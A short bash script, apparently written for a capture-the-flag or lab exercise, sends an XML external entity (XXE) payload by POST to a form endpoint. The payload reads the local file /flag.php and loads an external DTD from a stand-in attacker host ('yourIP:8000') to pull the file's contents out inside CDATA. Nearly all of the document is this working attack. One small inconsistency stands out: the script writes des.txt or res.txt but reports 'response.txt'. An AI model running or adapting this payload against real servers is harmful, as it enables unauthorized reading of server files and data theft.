#!/bin/bash

# Define the target URL
url="http://host/submitDetails.php"

# Define the headers
headers=(
  -H "Host: host"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36"
  -H "Content-Type: text/plain;charset=UTF-8"
  -H "Accept: */*"
  -H "Origin: http://host"
  -H "Referer: http://host/"
  -H "Accept-Encoding: gzip, deflate, br"
  -H "Accept-Language: en-US,en;q=0.9"
  -H "Connection: close"
)

# Define the XML payload
payload='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///flag.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://yourIP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
<root>
<name>ee</name>
<tel>8222222</tel>
<email>&joined;</email>
<message>2w22w2</message>
</root>'

# Send the POST request and save the response to a file
response=$(mktemp)
curl -X POST "${headers[@]}" --data "$payload" "$url" --output "$response"

# Check if the response is gzip encoded and decode if necessary
if file "$response" | grep -q gzip; then
  echo "Response is gzip encoded, decoding..."
  gunzip -c "$response" > des.txt
  rm "$response"
else
  mv "$response" res.txt
fi

echo "Response saved to response.txt"

